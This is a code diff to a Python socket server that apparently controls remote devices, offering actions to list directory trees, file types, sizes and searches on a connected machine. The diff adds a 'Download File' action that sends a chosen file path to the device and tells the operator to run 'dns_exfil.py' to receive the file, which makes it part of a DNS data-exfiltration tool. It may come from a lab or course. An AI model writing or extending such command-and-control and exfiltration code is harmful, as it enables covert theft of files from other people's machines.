@@ -3,6 +3,7 @@
 from datetime import datetime
 import socket
 import ssl
+import subprocess
 
 HOST = '127.0.0.1'
 PORT = 65432
@@ -20,7 +21,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             with conn:
                 print("A new device connected:", addr)
                 while True:
-                    print("\nList of actions: \n1. Get Tree \n2. Filetypes\n3. Filesize\n4. Search\n5. Close\n")
+                    print("\nList of actions: \n1. Get Tree \n2. Filetypes\n3. Filesize\n4. Search\n5. Download File\n6. Close\n")
                     i = int(input("Choose action: "))
                     conn.sendall(bytes([i]))
                     if i == 1:
@@ -56,6 +57,11 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                             line = (conn.recv(1024)).decode()
                             f.write(line)    
                         f.close()
+                    elif i == 5:
+                        print("Be sure dns_exfil.py is running to receive data.")
+                        fpath = str(input("Enter full path: "))
+                        conn.sendall(fpath.encode())
+                        input("Requested file transmitted? ")
                     else: break
                 conn.sendall(("Connection closed by server.").encode())
                 print("Device ", addr, " disconnected.")
